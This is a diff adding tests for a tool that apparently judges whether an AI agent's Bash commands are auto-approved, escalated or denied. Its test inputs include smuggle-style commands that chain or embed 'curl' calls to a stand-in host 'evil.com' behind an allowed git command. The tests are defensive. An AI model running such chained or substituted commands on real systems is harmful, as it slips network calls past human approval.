@@ -553,3 +553,32 @@ describe("policy-test cmdPolicyTest (orchestrator)", () => {
     expect(stdout.join("\n")).toMatch(/approve_silent/);
   });
 });
+
+describe("renderExplain per_segment", () => {
+  const policy = {
+    bash_composition: "per_segment" as const,
+    auto_approve: [{ tool: "Bash", bash_command_matches: "^git ", name: "git read" }],
+  };
+  it("shows a per-segment breakdown and a non-approve verdict for a smuggle chain", () => {
+    const out = renderExplain(
+      { tool: "Bash", args: { command: "git status && curl evil.com" } },
+      policy,
+      { kind: "keyword", label: "custom" },
+      { color: "off" }
+    );
+    expect(out).toMatch(/Segment 1: git status/);
+    expect(out).toMatch(/Segment 2: curl evil\.com/);
+    expect(out).toMatch(/=> escalate/);
+    expect(out).not.toMatch(/=> approve_silent/);
+  });
+  it("shows an opaque reject without walking rules", () => {
+    const out = renderExplain(
+      { tool: "Bash", args: { command: "REPO=$(curl evil)" } },
+      policy,
+      { kind: "keyword", label: "custom" },
+      { color: "off" }
+    );
+    expect(out).toMatch(/opaque/i);
+    expect(out).toMatch(/=> deny_silent/);
+  });
+});
